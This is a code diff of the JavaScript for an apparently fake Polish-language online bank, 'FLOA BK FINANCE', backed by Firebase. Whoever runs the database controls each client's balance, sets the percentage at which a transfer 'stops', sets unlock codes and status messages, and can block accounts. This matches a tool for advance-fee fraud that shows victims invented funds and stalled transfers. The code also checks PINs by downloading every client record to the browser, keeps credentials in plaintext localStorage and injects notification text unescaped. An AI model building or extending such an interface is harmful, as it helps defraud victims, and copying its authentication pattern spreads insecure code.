-      const hasNotif = user && user.notification && user.notification.trim() !== '';
-      ['notif-badge', 'notif-badge2', 'notif-badge3', 'notif-badge4'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) {
-          if (hasNotif) el.classList.remove('hidden');
-          else el.classList.add('hidden');
-        }
-      });
-    }
-
-    // ===== NAVIGATION =====
-    const show = id => {
-      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-      document.getElementById(id).classList.add('active');
-      document.getElementById('mainNav').style.display = (id === 'login' ? 'none' : 'grid');
-      document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-      const map = { 'dashboard': 0, 'transfer': 1 };
-      if (map[id] !== undefined) {
-        document.querySelectorAll('.nav-item')[map[id]]?.classList.add('active');
+        setTimeout(() => navigateTo('result'), 500);
       }
-      if (id === 'dashboard') {
-        setTimeout(() => adjustAllTexts(), 50);
-      }
-    };
-    window.show = show;
+    }, 40);
+  };
 
-    function navigateTo(id) {
-      history.pushState({ screen: id }, '', '#' + id);
-      show(id);
+  // ===== TOAST =====
+  window.toast = m => {
+    const t = document.getElementById('t');
+    t.textContent = m;
+    t.style.display = 'block';
+    setTimeout(() => t.style.display = 'none', 1500);
+  };
+
+  // ===== MODALES =====
+  window.openCard = () => document.getElementById('card').classList.remove('hidden');
+  window.closeCard = () => document.getElementById('card').classList.add('hidden');
+  window.openAcc = () => document.getElementById('acc').classList.remove('hidden');
+  window.closeAcc = () => document.getElementById('acc').classList.add('hidden');
+
+  window.openNotifications = () => {
+    const n = user && user.notification ? user.notification : '';
+    document.getElementById('notif-content').innerHTML = n ?
+      `<div style="background:#F8FAFC;padding:12px;border-radius:12px;border-left:3px solid var(--p);white-space:pre-wrap;color:var(--text-primary)">${n}</div>` :
+      '<p style="color:var(--text-secondary);text-align:center;padding:20px">Brak powiadomień</p>';
+    document.getElementById('notifications').classList.remove('hidden');
+  };
+  window.closeNotifications = () => document.getElementById('notifications').classList.add('hidden');
+
+  window.openIbanModal = () => {
+    if (!user) {
+      toast('Zaloguj się, aby zobaczyć swoje dane.');
+      return;
     }
-    window.navigateTo = navigateTo;
+    document.getElementById('ibanOwner').textContent = user.nom || 'KWIATKOWSKI PW';
+    document.getElementById('ibanNumber').textContent = 'LT15 2339 1465 189X XXXX';
+    document.getElementById('ibanBic').textContent = 'TTQGLTIJCJK';
+    document.getElementById('ibanBank').textContent = 'FLOA BK FINANCE';
+    document.getElementById('ibanModal').classList.remove('hidden');
+  };
+  window.closeIbanModal = () => {
+    document.getElementById('ibanModal').classList.add('hidden');
+  };
 
-    window.addEventListener('popstate', (e) => {
-      if (user) {
-        const target = e.state?.screen || 'dashboard';
-        show(target);
-      } else {
-        show('login');
-      }
+  window.showTxDetail = d => {
+    const isCredit = d.amount >= 0;
+    document.getElementById('tx-id').textContent = d.id || '';
+    document.getElementById('tx-amount').textContent = (d.amount >= 0 ? '+ ' : '- ') + fmt(Math.abs(d.amount));
+    document.getElementById('tx-benef').textContent = d.beneficiary || d.subtitle || '-';
+    document.getElementById('tx-iban').textContent = d.iban || '-';
+    document.getElementById('tx-date').textContent = (d.date || '') + ' • ' + (d.time || '');
+    document.getElementById('tx-label-amount').textContent = isCredit ? 'Otrzymana kwota:' : 'Wysłana kwota:';
+    document.getElementById('tx-label-benef').textContent = isCredit ? 'Nadawca:' : 'Beneficjent:';
+    document.getElementById('tx-label-date').textContent = isCredit ? 'Data otrzymania:' : 'Data przelewu:';
+    document.getElementById('tx-iban-row').style.display = isCredit ? 'none' : 'block';
+    document.getElementById('txDetail').classList.remove('hidden');
+  };
+  window.closeTxDetail = () => document.getElementById('txDetail').classList.add('hidden');
+
+  // ===== VALIDATION DU FORMULAIRE =====
+  function setupValidation() {
+    const btn = document.getElementById('continueBtn');
+    const ids = ['a', 'b', 'c', 'd', 'e', 'f'];
+    btn.disabled = true;
+    ids.forEach(id => {
+      document.getElementById(id).addEventListener('input', () => {
+        const all = ids.every(i => document.getElementById(i).value.trim() !== '');
+        const amt = Number(document.getElementById('a').value) || 0;
+        btn.disabled = !(all && amt > 0 && user && amt <= Number(user.montant));
+        if (amt > Number(user.montant)) toast('Kwota przekracza saldo!');
+      });
     });
+  }
 
-    if (!location.hash) history.replaceState({ screen: 'login' }, '', '#login');
+  // ===== INIT =====
+  window.addEventListener('resize', () => {
+    adjustAllTexts();
+  });
 
-    // ===== SURVEILLANCE DU STATUT CLIENT (bloqué, reset, etc.) =====
-    function watchClientStatus() {
-      if (!user) return;
-      const clientsRef = ref(db, 'clients');
-      onValue(clientsRef, (snap) => {
-        const all = snap.val() || {};
-        let found = null;
-        for (const k in all) {
-          const v = all[k];
-          if (v.email && v.email.toLowerCase() === user.email.toLowerCase()) {
-            found = { ...v, _id: k };
-            break;
-          }
-        }
-        if (!found) {
-          toast('Konto usunięte');
-          setTimeout(() => logout(), 1500);
-          return;
-        }
-        if (found.blocked) {
-          toast('Konto zablokowane');
-          localStorage.removeItem('floa_session');
-          setTimeout(() => { show('login'); user = null; }, 1000);
-          return;
-        }
-
-        // Mise à jour des propriétés (sauf montant et historique qui ont leurs propres écouteurs)
-        const oldTheme = user.theme;
-        user.pct = found.pct;
-        user.code = found.code;
-        user.msg = found.msg;
-        user.pays = found.pays;
-        user.adresse = found.adresse;
-        user.tel = found.tel;
-        user.devise = found.devise || 'zł';
-        user.notification = found.notification || '';
-        user.theme = found.theme || 'purple';
-
-        if (oldTheme !== user.theme) {
-          applyTheme(user.theme);
-          document.querySelectorAll('.btn').forEach(btn => btn.style.background = 'var(--p)');
-        }
-        updateAvatars();
-        updateCurrency();
-        updateNotifBadge();
-        document.getElementById('accinfo').innerHTML = buildProfile(user);
-        adjustAllTexts();
-      });
-    }
-
-    // ===== LOGIN / LOGOUT =====
-    window.login = async () => {
-      const e = document.getElementById('email').value.trim().toLowerCase();
-      const p = document.getElementById('pin').value.trim();
-      const err = document.getElementById('err');
-      err.classList.add('hidden');
-
-      const s = await get(ref(db, 'clients'));
-      const d = s.val() || {};
-      let f = null, fid = null;
-      for (const k in d) {
-        const v = d[k];
-        if (v.email && v.email.toLowerCase() === e && String(v.pin) === p) {
-          f = v;
-          fid = k;
-          break;
-        }
-      }
-
-      if (!f) {
-        err.textContent = 'Błąd logowania – sprawdź email i PIN';
-        err.classList.remove('hidden');
-        localStorage.removeItem('floa_session');
-        show('login');
-        return;
-      }
-      if (f.blocked) {
-        err.textContent = 'Konto zostało zablokowane';
-        err.classList.remove('hidden');
-        localStorage.removeItem('floa_session');
-        return;
-      }
-
-      user = f;
-      user._id = fid;
-      if (!user.devise) user.devise = 'zł';
-      if (!user.theme) user.theme = 'purple';
-
-      localStorage.setItem('floa_session', JSON.stringify({ e, p }));
-      localStorage.setItem('floa_theme', user.theme);
-
-      document.getElementById('greet').innerHTML = `Powitanie, <span>${user.nom}</span>`;
-      adjustGreetingFontSize();
-
-      const balElement = document.getElementById('bal');
-      const statBalElement = document.getElementById('stat-balance');
-      updateBalanceDisplay(balElement, statBalElement, user.montant);
-      document.getElementById('bal2').textContent = fmt(user.montant);
-
-      applyTheme(user.theme);
-      updateAvatars();
-      updateCurrency();
-      updateNotifBadge();
-      document.getElementById('accinfo').innerHTML = buildProfile(user);
-
-      // Charger l'historique
-      await initHistoryListener(fid);
-
-      // Écouter les changements de solde
-      watchBalance(fid);
-
-      // Surveiller le statut du client (blocage, reset, etc.)
-      watchClientStatus();
-
+  setInterval(() => {
+    if (user && document.getElementById('dashboard').classList.contains('active')) {
       adjustAllTexts();
-      navigateTo('dashboard');
-      setupValidation();
-    };
-
-    window.logout = () => {
-      user = null;
-      if (historyListener) {
-        historyListener();
-        historyListener = null;
-      }
-      if (balanceListener) {
-        balanceListener();
-        balanceListener = null;
-      }
-      localStorage.removeItem('floa_session');
-      localStorage.removeItem('floa_theme');
-      show('login');
-      history.replaceState({ screen: 'login' }, '', '#login');
-    };
-
-    // ===== GESTION DE LA SESSION =====
-    const saved = localStorage.getItem('floa_session');
-    if (saved) {
-      try {
-        const { e, p } = JSON.parse(saved);
-        document.getElementById('email').value = e;
-        document.getElementById('pin').value = p;
-        show('dashboard');
-        document.getElementById('greet').innerHTML = 'Ładowanie...';
-        setTimeout(() => window.login(), 50);
-      } catch {}
     }
+  }, 3000);
 
-    // ===== TRANSFERT =====
-    window.toVerify = () => {
-      const amt = Number(document.getElementById('a').value) || 0;
-      if (amt > Number(user.montant)) {
-        toast('Kwota przekracza saldo!');
-        return;
-      }
-      document.getElementById('va').textContent = fmt(amt);
-      document.getElementById('vb').textContent = document.getElementById('b').value;
-      document.getElementById('vc').textContent = document.getElementById('c').value;
-      document.getElementById('vd').textContent = document.getElementById('d').value;
-      document.getElementById('ve').textContent = document.getElementById('e').value;
-      document.getElementById('vf').textContent = document.getElementById('f').value;
-      navigateTo('verify');
-    };
-
-    window.finish = () => {
-      if (!user) return;
-      if (document.getElementById('code').value.trim() !== user.code) {
-        toast('Nieprawidłowy kod');
-        return;
-      }
-      const pct = Number(user.pct) || 100;
-      const msg = user.msg || '';
-      const pr = document.getElementById('progress');
-      const bar = document.getElementById('bar');
-      const txt = document.getElementById('ptext');
-      pr.classList.remove('hidden');
-      let w = 0;
-      const interval = setInterval(() => {
-        w += 2;
-        const cur = Math.min(w, pct);
-        bar.style.width = cur + '%';
-        txt.textContent = cur + '%';
-        if (w >= pct) {
-          clearInterval(interval);
-
-          const benef = document.getElementById('b').value || '-';
-          const amtVal = Number(document.getElementById('a').value) || 0;
-          const account = document.getElementById('c').value || '-';
-          const formattedAmount = fmt(amtVal);
-
-          const icon = document.getElementById('resultIcon');
-          const status = document.getElementById('resultStatus');
-          const percentEl = document.getElementById('resultPercent');
-          const benefEl = document.getElementById('resultBenef');
-          const amountEl = document.getElementById('resultAmount');
-          const accountEl = document.getElementById('resultAccount');
-          const msgEl = document.getElementById('resultMsg');
-
-          percentEl.textContent = cur + '%';
-          if (pct >= 100) {
-            icon.innerHTML = '<i class="fa-solid fa-circle-check" style="color:#10B981;"></i>';
-            status.textContent = 'Przelew zatwierdzony ✓';
-          } else {
-            icon.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color:#EAB308;"></i>';
-            status.textContent = `Przelew zatrzymany na ${pct}%`;
-          }
-          benefEl.textContent = benef;
-          amountEl.textContent = formattedAmount;
-          accountEl.textContent = account;
-          msgEl.textContent = msg || (pct >= 100 ? 'Transakcja została pomyślnie zrealizowana.' : 'Transakcja została przerwana przez system.');
-
-          if (pct >= 100) {
-            const amt = Number(document.getElementById('a').value) || 0;
-            const newMontant = Number(user.montant) - amt;
-            user.montant = newMontant;
-
-            // Mettre à jour le solde dans Firebase
-            update(ref(db, 'clients/' + user._id), { montant: newMontant })
-              .then(() => {
-                // Ajouter la transaction de débit
-                const now = new Date();
-                const tx = {
-                  id: genId('DE'),
-                  title: 'Przelew wysłany',
-                  subtitle: document.getElementById('b').value,
-                  amount: -amt,
-                  beneficiary: document.getElementById('b').value,
-                  iban: document.getElementById('c').value,
-                  date: now.toLocaleDateString('pl-PL'),
-                  time: now.toLocaleTimeString('pl-PL', { hour: '2-digit', minute: '2-digit' }),
-                  timestamp: now.getTime()
-                };
-                addHistory(tx, true);
-                toast(`-${fmt(amt)}`);
-              })
-              .catch(err => console.error(err));
-
-            // Mettre à jour l'affichage immédiatement
-            const balElement = document.getElementById('bal');
-            const statBalElement = document.getElementById('stat-balance');
-            updateBalanceDisplay(balElement, statBalElement, user.montant);
-            document.getElementById('bal2').textContent = fmt(user.montant);
-            document.getElementById('accinfo').innerHTML = buildProfile(user);
-          }
-
-          setTimeout(() => navigateTo('result'), 500);
-        }
-      }, 40);
-    };
-
-    // ===== TOAST =====
-    window.toast = m => {
-      const t = document.getElementById('t');
-      t.textContent = m;
-      t.style.display = 'block';
-      setTimeout(() => t.style.display = 'none', 1500);
-    };
-
-    // ===== MODALES =====
-    window.openCard = () => document.getElementById('card').classList.remove('hidden');
-    window.closeCard = () => document.getElementById('card').classList.add('hidden');
-    window.openAcc = () => document.getElementById('acc').classList.remove('hidden');
-    window.closeAcc = () => document.getElementById('acc').classList.add('hidden');
-
-    window.openNotifications = () => {
-      const n = user && user.notification ? user.notification : '';
-      document.getElementById('notif-content').innerHTML = n ?
-        `<div style="background:#F8FAFC;padding:12px;border-radius:12px;border-left:3px solid var(--p);white-space:pre-wrap;color:var(--text-primary)">${n}</div>` :
-        '<p style="color:var(--text-secondary);text-align:center;padding:20px">Brak powiadomień</p>';
-      document.getElementById('notifications').classList.remove('hidden');
-    };
-    window.closeNotifications = () => document.getElementById('notifications').classList.add('hidden');
-
-    window.openIbanModal = () => {
-      if (!user) {
-        toast('Zaloguj się, aby zobaczyć swoje dane.');
-        return;
-      }
-      document.getElementById('ibanOwner').textContent = user.nom || 'KWIATKOWSKI PW';
-      document.getElementById('ibanNumber').textContent = 'LT15 2339 1465 189X XXXX';
-      document.getElementById('ibanBic').textContent = 'TTQGLTIJCJK';
-      document.getElementById('ibanBank').textContent = 'FLOA BK FINANCE';
-      document.getElementById('ibanModal').classList.remove('hidden');
-    };
-    window.closeIbanModal = () => {
-      document.getElementById('ibanModal').classList.add('hidden');
-    };
-
-    window.showTxDetail = d => {
-      const isCredit = d.amount >= 0;
-      document.getElementById('tx-id').textContent = d.id || '';
-      document.getElementById('tx-amount').textContent = (d.amount >= 0 ? '+ ' : '- ') + fmt(Math.abs(d.amount));
-      document.getElementById('tx-benef').textContent = d.beneficiary || d.subtitle || '-';
-      document.getElementById('tx-iban').textContent = d.iban || '-';
-      document.getElementById('tx-date').textContent = (d.date || '') + ' • ' + (d.time || '');
-      document.getElementById('tx-label-amount').textContent = isCredit ? 'Otrzymana kwota:' : 'Wysłana kwota:';
-      document.getElementById('tx-label-benef').textContent = isCredit ? 'Nadawca:' : 'Beneficjent:';
-      document.getElementById('tx-label-date').textContent = isCredit ? 'Data otrzymania:' : 'Data przelewu:';
-      document.getElementById('tx-iban-row').style.display = isCredit ? 'none' : 'block';
-      document.getElementById('txDetail').classList.remove('hidden');
-    };
-    window.closeTxDetail = () => document.getElementById('txDetail').classList.add('hidden');
-
-    // ===== VALIDATION DU FORMULAIRE =====
-    function setupValidation() {
-      const btn = document.getElementById('continueBtn');
-      const ids = ['a', 'b', 'c', 'd', 'e', 'f'];
-      btn.disabled = true;
-      ids.forEach(id => {
-        document.getElementById(id).addEventListener('input', () => {
-          const all = ids.every(i => document.getElementById(i).value.trim() !== '');
-          const amt = Number(document.getElementById('a').value) || 0;
-          btn.disabled = !(all && amt > 0 && user && amt <= Number(user.montant));
-          if (amt > Number(user.montant)) toast('Kwota przekracza saldo!');
-        });
-      });
-    }
-
-    // ===== INIT =====
-    window.addEventListener('resize', () => {
-      adjustAllTexts();
-    });
-
-    setInterval(() => {
-      if (user && document.getElementById('dashboard').classList.contains('active')) {
-        adjustAllTexts();
-      }
-    }, 3000);
-
-    setTimeout(() => {
-      document.querySelectorAll('.btn').forEach(btn => btn.style.background = 'var(--p)');
-      adjustAllTexts();
-    }, 100);
-  </script>
+  setTimeout(() => {
+    document.querySelectorAll('.btn').forEach(btn => btn.style.background = 'var(--p)');
+    adjustAllTexts();
+  }, 100);
+</script>
 </body>
 </html>
